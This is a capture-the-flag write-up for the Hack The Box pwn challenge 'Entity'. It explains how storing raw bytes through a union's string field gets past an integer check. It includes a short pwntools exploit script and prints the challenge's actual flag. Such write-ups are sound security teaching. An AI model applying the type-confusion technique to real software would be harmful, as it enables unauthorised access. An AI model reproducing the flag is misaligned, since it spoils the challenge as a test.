# Entity
> Write-up author: vreshco
## DESCRIPTION:
This Spooky Time of the year, what's better than watching a scary film on the TV? Well, a lot of things, like playing CTFs but you know what's definitely not better? Something coming out of your TV!
## HINT:
- NONE
## STEPS:
1. Given 3 files -> 64 bit ELF, the source-code and the fake flag.
2. Let's check the binary's protections.

> VULN -> No Canary Found, Partial RELRO.

![image](https://user-images.githubusercontent.com/70703371/233789347-e9cdc9bd-c428-4fa5-ae4e-0a776ba0a525.png)


3. Let's analyze the source-code, analyzing the main() function, we know there's 3 functions we need to pay attention at.

![image](https://user-images.githubusercontent.com/70703371/233789392-a3fca842-f0aa-4307-ac30-359de3b66f26.png)


4. Start by the `set_field` function, there's no bufferoverflow, the input stored at the buf variable shall saved to the DataStore.integer.

![image](https://user-images.githubusercontent.com/70703371/233789432-4830f805-62d5-4f6e-ad94-6c66fa270fdd.png)


5. Analyzing the `get_field()` function, it just printed out the value stored.

![image](https://user-images.githubusercontent.com/70703371/233789520-1c649a02-869a-43b4-a2c2-2be25f4ca4bf.png)


7. At the `get_flag()` function which is our goal here, it shall printed out the flag if the integer variable of DataStore struct holds 13371337.

![image](https://user-images.githubusercontent.com/70703371/233789582-6a60693f-09e3-4609-85fa-254dc931600e.png)


8. But the problem is, at the `set_field()` function, we need to bypass the if statement, to prevent the program exits and we can use the value stored to get the flag.

![image](https://user-images.githubusercontent.com/70703371/233790009-77b9bf15-c2f2-4f62-8fd9-66aa5bed083c.png)


9. Seems like we need to call T to fill the value and press C to get the flag.
10. Then it shall asked, if we press T, then it asks what data type we want to store.

![image](https://user-images.githubusercontent.com/70703371/233790291-79848056-6774-4455-839b-c95c2a40a1ef.png)


11. But if we press R before, it shall asks what data type stored that we want to print.
12. Anyway let's run the binary.

![image](https://user-images.githubusercontent.com/70703371/233790347-148172a5-66ce-4246-825c-4705537f0438.png)


13. Since it's comparing the integer value in order to get the flag, let's input integer then.

![image](https://user-images.githubusercontent.com/70703371/233790398-db8f1f92-f020-429c-b8ae-f69b8712f2bb.png)


14. Forgot that it quits right after it compared the integer.

![image](https://user-images.githubusercontent.com/70703371/233790412-f1c55d90-328d-43e4-abf3-d17f14ab7ae7.png)


15. Means we need to send strings and get the flag with it (?)

![image](https://user-images.githubusercontent.com/70703371/233790494-30cf174b-0d3f-45db-86ad-4796b5283703.png)


16. Yep it denies it, the only way to bypass this, we need to sends the hex or we can sends raw bytes.
17. Let's build the script.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './entity'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

sh = start()

p = flat([
    13371337
])

sh.sendlineafter(b'>> ',b'T')
sh.sendlineafter(b'>> ', b'S')
sh.sendlineafter(b'>> ', p)
sh.sendlineafter(b'>> ', b'C')

sh.interactive()
```

> TEST LOCALLY

![image](https://user-images.githubusercontent.com/70703371/233790667-7791fd76-a69b-4b32-8086-fe8b3d31d24e.png)


> TEST REMOTELY

![image](https://user-images.githubusercontent.com/70703371/233790697-e382b727-c64f-41ff-86fd-3971fcd8b3a3.png)


18. Got the flag!


## FLAG

```
HTB{th3_3nt1ty_0f_htb00_i5_5t1ll_h3r3}
```


